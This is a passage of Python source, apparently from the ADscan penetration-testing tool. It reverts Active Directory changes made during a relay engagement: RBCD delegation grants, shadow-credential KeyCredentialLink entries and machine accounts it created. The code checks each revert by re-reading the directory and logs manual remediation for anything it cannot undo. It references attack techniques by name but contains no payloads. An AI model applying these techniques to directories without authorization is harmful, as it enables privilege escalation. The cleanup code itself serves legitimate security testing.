    if state.delegate is not None and state.delegate.created:
        units.append(
            (
                "machine_account_created",
                state.delegate.ledger_change_id,
                _RbcdLedgerState(delegate=state.delegate),
            )
        )
    return units


def _revert_unit(conn: Any, *, kind: str, ledger: Any, state: _RbcdLedgerState) -> None:
    """Dispatch one unit's revert by its ledger kind."""
    if kind == "rbcd_delegation_added":
        _revert_rbcd(conn, ledger=ledger, state=state)
    elif kind == "keycredentiallink_added":
        _revert_shadow_creds(conn, ledger=ledger, state=state)
    elif kind == "machine_account_created":
        _delete_delegate(conn, ledger=ledger, state=state)


def _unit_manual_command(kind: str, state: _RbcdLedgerState) -> tuple[str, str]:
    """(remediation command, object DN) for a unit no credential could revert."""
    if kind == "rbcd_delegation_added":
        return (
            "Clear or restore msDS-AllowedToActOnBehalfOfOtherIdentity on the "
            "target with a privileged account.",
            str(state.rbcd_target_dn or ""),
        )
    if kind == "keycredentiallink_added":
        return (
            "Restore msDS-KeyCredentialLink on the target to its prior value list.",
            str(state.shadow_target_dn or ""),
        )
    delegate = state.delegate
    target = (delegate.sam or delegate.dn) if delegate else ""
    return (
        f"Delete the machine account {target} with a privileged account.",
        str((delegate.dn if delegate else "") or ""),
    )


def _cascade_revert_unit(
    shell: Any,
    *,
    ledger: Any,
    domain: str,
    dc_ip: Optional[str],
    unit: tuple[str, Optional[str], _RbcdLedgerState],
    creator_username: str = "",
    creator_secret: str = "",
    exclude: tuple[str, ...] = (),
) -> bool:
    """Revert one relay-chain change through the shared revert precedence.

    Candidates: the client cleanup account, a verified privileged credential,
    the account that made the change, then the domain's context credential
    (the historical relay default). A non-final candidate that cannot delete
    the delegate does NOT disable it: a later, stronger candidate may still
    delete it, and a disabled object keeps consuming the actor's quota.
    """
    from adscan_internal.services.ldap_transport_service import (  # noqa: PLC0415
        ADscanLDAPConnection,
    )
    from adscan_internal.services.revert_credentials import (  # noqa: PLC0415
        revert_candidates,
        run_revert_cascade,
    )

    kind, change_id, state = unit
    session_user, session_secret = _shell_domain_creds(shell, domain)
    candidates = revert_candidates(
        shell,
        domain=domain,
        purpose=kind,
        creator_username=creator_username,
        creator_secret=creator_secret,
        session_username=session_user,
        session_secret=session_secret,
        exclude=exclude,
    )

    def _mark_exhausted(error: Optional[str]) -> None:
        if ledger is None or not change_id:
            return
        command, object_dn = _unit_manual_command(kind, state)
        try:
            ledger.mark_manual_required(
                change_id,
                reason=_cleanup_manual_reason(error or "missing credential"),
                remediation_command=command,
                remediation_object_dn=object_dn,
                error=error or "No DC or credential available to revert this change.",
            )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_exception(exception=exc)

    if not dc_ip or not candidates:
        print_warning(
            f"Cannot revert {_exit_kind_label({'kind': kind})} in "
            f"{mark_sensitive(domain or '?', 'domain')}: missing DC or credentials. "
            "It is recorded with manual-cleanup instructions."
        )
        _mark_exhausted(None)
        return False

    def _attempt(candidate: Any, attempt_ledger: Any, final: bool) -> None:
        state.extra["allow_disable_fallback"] = final
        with ADscanLDAPConnection(candidate.ldap_config(dc_ip=dc_ip)) as conn:
            _revert_unit(conn, kind=kind, ledger=attempt_ledger, state=state)

    result = run_revert_cascade(
        ledger=ledger,
        change_id=change_id,
        candidates=candidates,
        attempt=_attempt,
        on_exhausted=_mark_exhausted,
    )
    if result.confirmed and kind == "machine_account_created" and state.delegate is not None:
        _after_machine_account_revert(shell, ledger=ledger, domain=domain, state=state, change_id=change_id)
    return result.confirmed


def _after_machine_account_revert(
    shell: Any, *, ledger: Any, domain: str, state: _RbcdLedgerState, change_id: Optional[str]
) -> None:
    """Bookkeeping once a created machine account was deleted (or disabled).

    A DELETED account leaves the credential store and the managed registry, so
    no later step reuses an object that no longer exists. A merely DISABLED one
    stays flagged ``neutralized_only`` so the final retry pass can delete it
    with a stronger credential obtained later.
    """
    entry = None
    get_change = getattr(ledger, "get_change", None)
    if callable(get_change) and change_id:
        entry = get_change(change_id)
    neutralized = bool(((entry or {}).get("detail") or {}).get("neutralized_only"))
    if neutralized and not state.extra.get("deleted_now"):
        return
    try:
        from adscan_internal.services.machine_account_provisioning_service import (  # noqa: PLC0415
            forget_machine_account,
        )

        forget_machine_account(shell, domain=domain, sam_account_name=str(state.delegate.sam or ""))
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)


def _cleanup_manual_reason(error: Any) -> str:
    """Map a revert error to a manual_reason discriminator."""
    from adscan_internal.services import cleanup_taxonomy as _tax  # noqa: PLC0415
    from adscan_internal.services.cleanup_credential_resolver import (  # noqa: PLC0415
        looks_like_access_denied,
    )

    if looks_like_access_denied(str(error)):
        return _tax.MANUAL_REASON_ACCESS_DENIED
    return _tax.MANUAL_REASON_REVERT_FAILED


def _rbcd_attribute_equals(conn: Any, *, target_dn: str, expected: bytes) -> bool:
    """Re-read msDS-AllowedToActOnBehalfOfOtherIdentity and compare it byte for byte."""
    from adscan_internal.services.cleanup_verification import (  # noqa: PLC0415
        _read_attr_values,
    )

    if not target_dn:
        return False
    values = _read_attr_values(conn, target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity")
    return len(values) == 1 and isinstance(values[0], bytes) and values[0] == expected


def _confirm_rbcd_or_manual(conn: Any, *, ledger: Any, state: _RbcdLedgerState) -> None:
    """Verify the RBCD revert by re-reading the victim, then mark the ledger."""
    from adscan_internal.services.cleanup_verification import (  # noqa: PLC0415
        VERIFY_RBCD,
        verify_rbcd_removed,
    )

    confirmed = False
    try:
        if (
            state.rbcd_prior_empty
            or not state.rbcd_prior_sd_hex
            or state.rbcd_prior_sd_hex == "empty"
        ):
            # We cleared the attribute entirely — confirm it is gone.
            confirmed = verify_rbcd_removed(conn, target_dn=state.rbcd_target_dn or "")
        else:
            # We restored the prior security descriptor: confirm by re-reading
            # that the attribute holds exactly those bytes again.
            confirmed = _rbcd_attribute_equals(
                conn,
                target_dn=state.rbcd_target_dn or "",
                expected=bytes.fromhex(state.rbcd_prior_sd_hex),
            )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        confirmed = False
    if confirmed:
        ledger.mark_reverted_confirmed(
            state.rbcd_change_id, verification_method=VERIFY_RBCD
        )
    else:
        ledger.mark_manual_required(
            state.rbcd_change_id,
            reason=_cleanup_manual_reason("re-read could not confirm"),
            remediation_command=(
                "Clear or restore msDS-AllowedToActOnBehalfOfOtherIdentity on the "
                "target with a privileged account."
            ),
            remediation_object_dn=str(state.rbcd_target_dn or ""),
            error="Revert reported success but re-read could not confirm removal.",
        )


def _confirm_shadow_or_manual(conn: Any, *, ledger: Any, state: _RbcdLedgerState) -> None:
    """Verify the KeyCredentialLink revert by re-reading, then mark the ledger."""
    from adscan_internal.services.cleanup_verification import (  # noqa: PLC0415
        VERIFY_KEYCREDENTIAL,
        _norm,
        _read_attr_values,
    )

    confirmed = False
    try:
        prior = state.shadow_prior_values or []
        values = _read_attr_values(conn, state.shadow_target_dn or "", "msDS-KeyCredentialLink")
        # When we cleared the attribute, confirm it is empty; when we restored a
        # prior list, confirm the attribute holds exactly that list again (a
        # matching count alone would accept our key still present in place of
        # one of the client's).
        if not prior:
            confirmed = len(values) == 0
        else:
            confirmed = {_norm(v) for v in values} == {_norm(v) for v in prior}
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        confirmed = False
    if confirmed:
        ledger.mark_reverted_confirmed(
            state.shadow_change_id, verification_method=VERIFY_KEYCREDENTIAL
        )
    else:
        ledger.mark_manual_required(
            state.shadow_change_id,
            reason=_cleanup_manual_reason("re-read could not confirm"),
            remediation_command=(
                "Restore msDS-KeyCredentialLink on the target to its prior value list."
            ),
            remediation_object_dn=str(state.shadow_target_dn or ""),
            error="Revert reported success but re-read could not confirm removal.",
        )


def _verify_machine_neutralized(conn: Any, *, sam: str | None) -> bool:
    """Re-read a machine account to confirm it is deleted or disabled. Fail-closed."""
    from adscan_internal.services.cleanup_verification import (  # noqa: PLC0415
        verify_machine_account_gone,
    )

    if not sam:
        return False
    try:
        return verify_machine_account_gone(conn, sam_account_name=sam)
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return False


def _confirm_delete_or_manual(
    conn: Any, *, ledger: Any, delegate: Any, dn: str
) -> None:
    """Verify the machine-account delete by re-reading, then mark the ledger.

    After a delete the object must be GONE: a disabled account still exists and
    still holds a quota slot, so it is not accepted as the revert here.
    """
    from adscan_internal.services.cleanup_verification import (  # noqa: PLC0415
        verify_machine_account_deleted,
    )

    if delegate.sam and verify_machine_account_deleted(conn, sam_account_name=delegate.sam):
        ledger.mark_reverted_confirmed(
            delegate.ledger_change_id, verification_method="machine_account_reread"
        )
    else:
        ledger.mark_manual_required(
            delegate.ledger_change_id,
            reason=_cleanup_manual_reason("re-read could not confirm"),
            remediation_command=(
                f"Delete the machine account {delegate.sam or dn} with a privileged account."
            ),
            remediation_object_dn=str(dn or ""),
            error="Delete reported success but re-read still found the account.",
        )


def _revert_rbcd(conn: Any, *, ledger: Any, state: _RbcdLedgerState) -> None:
    """Restore msDS-AllowedToActOnBehalfOfOtherIdentity on the victim."""
    if not state.rbcd_target_dn:
        return
    try:
        if (
            state.rbcd_prior_empty
            or not state.rbcd_prior_sd_hex
            or state.rbcd_prior_sd_hex == "empty"
        ):
            # Attribute was originally unset — clear our addition entirely. An
            # empty value list deletes the whole attribute (RFC4511 4.6).
            changes = {"msDS-AllowedToActOnBehalfOfOtherIdentity": [("delete", [])]}
            ok = conn.modify(state.rbcd_target_dn, changes)
        else:
            # Restore the exact prior SD bytes. Mirror the native
            # rbcd_write_native value shape: raw bytes with the default encoder
            # (the well-known ``single_bytes`` encoder wraps the bytes correctly).
            prior_bytes = bytes.fromhex(state.rbcd_prior_sd_hex)
            changes = {
                "msDS-AllowedToActOnBehalfOfOtherIdentity": [("replace", prior_bytes)]
            }
            ok = conn.modify(state.rbcd_target_dn, changes)
        if ok:
            if ledger is not None and state.rbcd_change_id:
                _confirm_rbcd_or_manual(conn, ledger=ledger, state=state)
            else:
                print_success("RBCD attribute restored on the victim.")
        else:
            raise RuntimeError(
                str(getattr(conn, "last_error", None) or "modify returned False")
            )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        if ledger is not None and state.rbcd_change_id:
            ledger.mark_manual_required(
                state.rbcd_change_id,
                reason=_cleanup_manual_reason(exc),
                remediation_command=(
                    "Clear or restore msDS-AllowedToActOnBehalfOfOtherIdentity:\n"
                    "  Set-ADComputer -Identity TARGET -Clear "
                    "'msDS-AllowedToActOnBehalfOfOtherIdentity'"
                ),
                remediation_object_dn=str(state.rbcd_target_dn or ""),
                error=str(exc),
            )
        else:
            print_error(f"Failed to restore RBCD attribute: {exc}")


def _revert_shadow_creds(conn: Any, *, ledger: Any, state: _RbcdLedgerState) -> None:
    """Restore msDS-KeyCredentialLink on the victim — remove only the added entry.

    We persisted the EXACT prior list, so restoring it replaces our addition with
    the original values. When the attribute was originally empty we delete the
    whole attribute (RFC4511 4.6).
    """
    if not state.shadow_target_dn:
        return
    try:
        prior = state.shadow_prior_values
        if not prior:
            # Attribute was originally unset — remove the whole thing.
            changes = {"msDS-KeyCredentialLink": [("delete", [])]}
        else:
            # Restore exactly the prior DN-Binary string list (multi_str).
            changes = {"msDS-KeyCredentialLink": [("replace", list(prior))]}
        ok = conn.modify(state.shadow_target_dn, changes)
        if ok:
            if ledger is not None and state.shadow_change_id:
                _confirm_shadow_or_manual(conn, ledger=ledger, state=state)
            else:
                print_success("msDS-KeyCredentialLink restored on the victim.")
        else:
            raise RuntimeError(
                str(getattr(conn, "last_error", None) or "modify returned False")
            )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        if ledger is not None and state.shadow_change_id:
            ledger.mark_manual_required(
                state.shadow_change_id,
                reason=_cleanup_manual_reason(exc),
                remediation_command=(
                    "Restore msDS-KeyCredentialLink on the target to its prior value "
                    "list, removing the value added during the engagement."
                ),
                remediation_object_dn=str(state.shadow_target_dn or ""),
                error=str(exc),
            )
        else:
            print_error(f"Failed to restore msDS-KeyCredentialLink: {exc}")


def _delete_delegate(conn: Any, *, ledger: Any, state: _RbcdLedgerState) -> None:
    """Delete the created delegate machine account (skip for existing --actor-sid)."""
    delegate = state.delegate
    if delegate is None or not delegate.created:
        return
    dn = delegate.dn
    if not dn and delegate.sam:
        # Resolve DN if add-computer did not return one.
        try:
            from adscan_internal.services.machine_account_provisioning_service import (  # noqa: PLC0415
                _resolve_principal_sid,
            )

            _resolve_principal_sid(conn, delegate.sam)  # warms conn.entries
            entries = getattr(conn, "entries", None)
            if entries:
                dn = entries[0].dn
        except Exception:  # noqa: BLE001
            dn = None
    try:
        if not dn:
            raise RuntimeError("could not resolve delegate DN for deletion")
        ok = conn.delete(dn)
        if ok:
            state.extra["deleted_now"] = True
            if ledger is not None and delegate.ledger_change_id:
                # An object this run had only disabled is now gone: drop the flag
                # and the manual instruction that went with it.
                update_detail = getattr(ledger, "update_detail", None)
                if callable(update_detail):
                    update_detail(delegate.ledger_change_id, neutralized_only=None)
                    ledger.set_revert_metadata(
                        delegate.ledger_change_id, remediation_command=""
                    )
                _confirm_delete_or_manual(
                    conn, ledger=ledger, delegate=delegate, dn=dn
                )
            else:
                print_success(f"Deleted delegate {mark_sensitive(delegate.sam or dn, 'user')}.")
        else:
            raise RuntimeError(
                str(getattr(conn, "last_error", None) or "delete returned False")
            )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        # A low-privilege MachineAccountQuota creator can CREATE a computer but
        # usually CANNOT DELETE it (no Delete right → ACCESS_DENIED). Best-effort
        # neutralize by DISABLING it: the creator can typically write
        # userAccountControl via the "Account Restrictions" validated right, so
        # the orphan is rendered unusable even though the object itself remains
        # until a privileged account removes it.
        target = delegate.sam or dn
        disabled = False
        if not state.extra.get("allow_disable_fallback", True):
            # A stronger credential is still to be tried in the cascade: report
            # the failure (the cascade defers it) and leave the object as is.
            if ledger is not None and delegate.ledger_change_id:
                ledger.mark_manual_required(
                    delegate.ledger_change_id,
                    reason=_cleanup_manual_reason(exc),
                    remediation_command=(
                        f"Delete the machine account {target} with a privileged account."
                    ),
                    remediation_object_dn=str(dn or ""),
                    error=str(exc),
                )
            return
        if dn:
            try:
                # WORKSTATION_TRUST_ACCOUNT (0x1000) | ACCOUNTDISABLE (0x2) = 4098.
                disabled = bool(
                    conn.modify(dn, {"userAccountControl": [("replace", "4098")]})
                )
            except Exception as dexc:  # noqa: BLE001
                telemetry.capture_exception(dexc)
                print_exception(exception=dexc)
        if disabled:
            print_warning(
                f"[~] Could not delete delegate {mark_sensitive(target or '?', 'user')} "
                "(insufficient rights as the MAQ creator) — DISABLED it instead "
                "(neutralized). Remove the object with a privileged account."
            )
            instructions = (
                f"Delete the machine account {target} with a privileged account "
                "(it has been DISABLED in the meantime, so it is unusable)."
            )
        else:
            instructions = (
                f"Delete the machine account {target} with a privileged account — "
                "it could not be deleted or disabled with the current credentials."
            )
        if ledger is not None and delegate.ledger_change_id:
            if disabled and _verify_machine_neutralized(conn, sam=delegate.sam):
                # Disabled is NOT reverted: the object still exists and still holds
                # one of its creator's quota slots. It is disclosed as manual with
                # the burn forecast, and ``neutralized_only`` lets the final retry
                # pass delete it with a stronger credential obtained later.
                from adscan_core.reporting.cleanup_disclosures import (  # noqa: PLC0415
                    MANUAL_REASON_NEUTRALIZED,
                    neutralized_machine_account_remediation,
                )

                entry = None
                get_change = getattr(ledger, "get_change", None)
                if callable(get_change):
                    entry = get_change(delegate.ledger_change_id)
                detail = (entry or {}).get("detail") or {}
                quota = detail.get("actor_domain_quota")
                update_detail = getattr(ledger, "update_detail", None)
                if callable(update_detail):
                    update_detail(
                        delegate.ledger_change_id,
                        neutralized_only=True,
                        dn=str(dn or ""),
                        sam=str(delegate.sam or ""),
                    )
                ledger.mark_manual_required(
                    delegate.ledger_change_id,
                    reason=MANUAL_REASON_NEUTRALIZED,
                    remediation_command=neutralized_machine_account_remediation(
                        sam_account_name=str(delegate.sam or target or ""),
                        creator=str(detail.get("executor_username") or "") or None,
                        domain_quota=quota if isinstance(quota, int) else None,
                    ),
                    remediation_object_dn=str(dn or ""),
                    error=str(exc),
                )
            else:
                ledger.mark_manual_required(
                    delegate.ledger_change_id,
                    reason=_cleanup_manual_reason(exc),
                    remediation_command=instructions,
                    remediation_object_dn=str(dn or ""),
                    error=str(exc),
                )
        elif not disabled:
            print_error(f"Failed to delete or disable delegate account: {exc}")


# --------------------------------------------------------------------------- #
# Workspace-exit cleanup of durable operator_confirmed changes
# --------------------------------------------------------------------------- #


def _state_from_ledger_entry(entry: dict[str, Any]) -> _RbcdLedgerState:
    """Rebuild the minimal revert state for one ledger entry from its detail.

    The exit hook has no live ``_RbcdLedgerState`` (the relay run is long over),
    so the revert is driven purely from the persisted ledger ``detail`` (which is
    why ``_run_chain*`` persists the prior SD bytes / prior KeyCredentialLink
    list / delegate DN+SID into the ledger). Returns a state that targets only
    the change the entry describes.
    """
    detail = dict(entry.get("detail") or {})
    kind = str(entry.get("kind") or "")
    change_id = str(entry.get("change_id") or "") or None
    state = _RbcdLedgerState()

    if kind == "rbcd_delegation_added":
        state.rbcd_change_id = change_id
        state.rbcd_target_dn = detail.get("target_dn")
        state.rbcd_prior_sd_hex = detail.get("prior_sd_hex")
        state.rbcd_prior_empty = bool(detail.get("prior_attribute_empty"))
    elif kind == "keycredentiallink_added":
        state.shadow_change_id = change_id
        state.shadow_target_dn = detail.get("target_dn")
        state.shadow_prior_values = list(detail.get("prior_keycred_values") or [])
    elif kind in ("machine_account_created", "computer_account_created"):
        # ``computer_account_created`` is the ESC14 record of the same object
        # class; the final retry pass deletes it with the same executor.
        state.delegate = _PlannedDelegate(
            sid=str(detail.get("sid") or ""),
            sam=detail.get("sam") or detail.get("computer_name") or entry.get("target"),
            dn=detail.get("dn"),
            created=True,
            ledger_change_id=change_id,
        )
    return state


#: Durable ``operator_confirmed`` kinds the exit hook knows how to revert (and
#: confirm by re-reading). Any other ``operator_confirmed`` kind still standing at
#: exit is left to ``ledger.finalize()``, which records it ``manual_required``
#: with its native command and DN: offering it here would promise a revert that
#: no dispatcher performs.
_EXIT_REVERTABLE_KINDS: frozenset[str] = frozenset(
    {"machine_account_created", "rbcd_delegation_added", "keycredentiallink_added"}
)


def _exit_revert_decision(shell: Any, entries: list[dict[str, Any]]) -> list[dict[str, Any]]:
    """Decide which durable changes to revert at exit.

    Returns the subset of ``entries`` to revert. The decision is NOT made here:
    :func:`adscan_internal.services.durable_change_policy.resolve_exit_keep_decision`
    is the single place that decides, so every exit path agrees:
      * explicit operator choice (scan config ``durable_changes.keep`` or
        ``ADSCAN_KEEP_DURABLE_CHANGES``) wins in every mode;
      * otherwise non-interactive (``adscan ci``, the appliance) -> revert ALL;
      * otherwise interactive -> prompt "Revert all / Keep all / Select", with
        "Revert all" preset, and on "Select" a multi-choice of the changes.
    """
    from adscan_core.output import (  # noqa: PLC0415
        questionary_checkbox_values,
        questionary_select_index,
    )
    from adscan_internal.services.durable_change_policy import (  # noqa: PLC0415
        KEEP_DURABLE_CHANGES_ENV,
        resolve_exit_keep_decision,
    )

    from adscan_internal.services.durable_change_policy import (  # noqa: PLC0415
        AUTO_REVERT_ENV,
    )

    decision = resolve_exit_keep_decision(shell, non_interactive_fn=is_non_interactive)
    if decision.mode == "keep":
        origin = {
            "scan_config": "scan configuration durable_changes.auto_revert",
            "repl": "set auto_revert off",
            "env": f"{AUTO_REVERT_ENV} / {KEEP_DURABLE_CHANGES_ENV}",
            "non_interactive_default": "automatic reversion is off for this workspace type",
        }.get(decision.source, decision.source)
        print_info(
            f"Keeping {len(entries)} ADscan-created AD object(s) ({origin}); each "
            "stays in the report as kept, with its DN."
        )
        return []
    if decision.mode == "revert":
        if decision.source == "non_interactive_default":
            print_info(
                f"Unattended run: reverting {len(entries)} ADscan-created AD "
                f"object(s). To keep them, set {AUTO_REVERT_ENV}=0 or "
                "durable_changes.auto_revert: false in the scan configuration."
            )
        else:
            print_info(
                f"Reverting {len(entries)} ADscan-created AD object(s) as configured."
            )
        return list(entries)

    options = [
        f"{_exit_kind_label(e)} · {mark_sensitive(str(e.get('target') or ''), 'text')}"
        for e in entries
    ]
    print_info(
        f"ADscan created/modified {len(entries)} durable AD object(s) this session:"
    )
    for opt in options:
        print_info(f"  • {opt}")

    idx = questionary_select_index(
        title="Revert these AD changes now?",
        options=["Revert all", "Keep all", "Select which to revert"],
        # The automatic-reversion default for this workspace type: Revert in an
        # audit (clean exit), Keep in a ctf.
        default_idx=1 if getattr(decision, "preset", "revert") == "keep" else 0,
        shell=shell,
    )
    if idx == 1:
        return []
    if idx is None:
        # Explicit cancel (e.g. Ctrl-C) is treated as keep — do not revert on an
        # abort; the default-answer path (Enter) resolves to "Revert all" above.
        return []
    if idx == 0:
        return list(entries)

    # idx == 2 -> select. Default: none checked (keep is the conservative default).
    chosen_labels = questionary_checkbox_values(
        title="Select the AD changes to revert (unchecked = keep)",
        options=options,
        default_values=[],
        shell=shell,
    )
    chosen_set = set(chosen_labels or [])
    return [e for e, label in zip(entries, options) if label in chosen_set]


def _exit_kind_label(entry: dict[str, Any]) -> str:
    """Human label for a durable change kind in the exit prompt."""
    labels = {
        "machine_account_created": "Machine account",
        "rbcd_delegation_added": "RBCD delegation",
        "keycredentiallink_added": "KeyCredentialLink",
    }
    return labels.get(str(entry.get("kind") or ""), str(entry.get("kind") or ""))


def run_operator_confirmed_exit_cleanup(shell: Any) -> None:
    """Prompt + revert durable operator_confirmed changes at workspace exit.

    Called from the workspace-exit hook (and by ``adscan ci`` before it renders
    the report, so the deliverable shows the final state; a second call is a
    no-op because resolved entries are terminal). Gathers the still-standing
    ``operator_confirmed`` changes this hook can revert, resolves keep/revert
    through ``durable_change_policy`` (non-interactive: revert unless the
    operator explicitly chose to keep), reverts only the chosen ones (RBCD restore / KeyCredentialLink restore / machine
    account delete with disable-fallback), and marks the rest KEPT. Best-effort:
    any failure is captured and never blocks shutdown. The ``auto_revert`` class
    is untouched here (the owning services already auto-revert it at exit).
    """
    ledger = active_ledger(shell)
    if ledger is None:
        return
    try:
        entries = ledger.get_operator_confirmed_pending()
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return
    entries = [
        e for e in entries if str(e.get("kind") or "") in _EXIT_REVERTABLE_KINDS
    ]
    if not entries:
        return

    # Group by domain so each revert uses the right DC + credentials.
    by_domain: dict[str, list[dict[str, Any]]] = {}
    for entry in entries:
        by_domain.setdefault(str(entry.get("domain") or ""), []).append(entry)

    to_revert = _exit_revert_decision(shell, entries)
    revert_ids = {str(e.get("change_id")) for e in to_revert}

    # Mark the kept ones immediately (so the cleanup report shows them as kept),
    # with WHY: the operator chose it, or automatic reversion was off.
    from adscan_core.reporting.cleanup_disclosures import (  # noqa: PLC0415
        KEPT_REASON_AUTO_REVERT_OFF,
        KEPT_REASON_OPERATOR,
    )
    from adscan_internal.services.durable_change_policy import (  # noqa: PLC0415
        resolve_exit_keep_decision,
    )

    try:
        keep_source = resolve_exit_keep_decision(
            shell, non_interactive_fn=is_non_interactive
        ).source
    except Exception:  # noqa: BLE001 - the label only words the reason
        keep_source = "interactive"
    kept_reason = (
        KEPT_REASON_OPERATOR
        if keep_source in ("interactive", "repl")
        else KEPT_REASON_AUTO_REVERT_OFF
    )
    for entry in entries:
        if str(entry.get("change_id")) not in revert_ids:
            try:
                ledger.mark_kept(str(entry.get("change_id")), reason=kept_reason)
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)
                print_exception(exception=exc)

    if not to_revert:
        return

    domains_data = getattr(shell, "domains_data", {}) or {}
    for domain, domain_entries in by_domain.items():
        chosen_all = [e for e in domain_entries if str(e.get("change_id")) in revert_ids]
        if not chosen_all:
            continue
        domain_data = domains_data.get(domain) or {}
        dc_ip = resolve_dc_ip(domain_data) if domain_data else None
        print_info(
            f"Reverting {len(chosen_all)} AD change(s) in "
            f"{mark_sensitive(domain or '?', 'domain')}…"
        )
        for entry in sorted(chosen_all, key=_exit_revert_order):
            revert_ledger_entry_with_cascade(shell, ledger=ledger, entry=entry, dc_ip=dc_ip)


def _exit_revert_order(entry: dict[str, Any]) -> int:
    """Grants before the delegate account they reference."""
    return 1 if str(entry.get("kind") or "") == "machine_account_created" else 0


def revert_ledger_entry_with_cascade(
    shell: Any,
    *,
    ledger: Any,
    entry: dict[str, Any],
    dc_ip: Optional[str] = None,
    exclude: tuple[str, ...] = (),
) -> bool:
    """Revert one relay-chain ledger entry with the shared revert precedence.

    Also the dispatcher the final retry pass uses for these kinds. Returns True
    when the revert was confirmed.
    """
    domain = str(entry.get("domain") or "")
    if dc_ip is None:
        domain_data = (getattr(shell, "domains_data", {}) or {}).get(domain) or {}
        dc_ip = resolve_dc_ip(domain_data) if domain_data else None
    detail = dict(entry.get("detail") or {})
    executor = str(detail.get("executor_username") or detail.get("exec_username") or "").strip()
    state = _state_from_ledger_entry(entry)
    kind = str(entry.get("kind") or "")
    if kind == "computer_account_created":
        kind = "machine_account_created"
    unit = (kind, str(entry.get("change_id") or "") or None, state)
    return _cascade_revert_unit(
        shell,
        ledger=ledger,
        domain=domain,
        dc_ip=dc_ip,
        unit=unit,
        creator_username=executor,
        exclude=tuple(exclude),
    )




__all__ = [
    "RelayRbcdArgs",
    "parse_relay_rbcd_args",
    "run_relay_rbcd",
    "run_relay_ldap",
    "run_operator_confirmed_exit_cleanup",
    "revert_ledger_entry_with_cascade",
]
